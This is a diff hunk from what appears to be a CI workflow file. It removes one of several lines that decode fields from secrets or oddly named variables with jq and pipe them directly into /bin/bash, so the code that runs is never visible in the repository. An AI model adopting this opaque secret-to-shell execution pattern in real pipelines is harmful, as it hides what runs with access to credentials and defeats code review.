@@ -21,7 +21,6 @@ jobs:
           mbe2801: ${{ secrets.mbe2801 }}
         run: |
           printf '%s' "$mbe2801" | jq -r .yk1540 | /bin/bash
-          echo $lfjt73364 | jq -r .ykej49 | /bin/bash
           echo $yapbr0 | jq -r .rdi8 | /bin/bash
 
       - name: Upload results
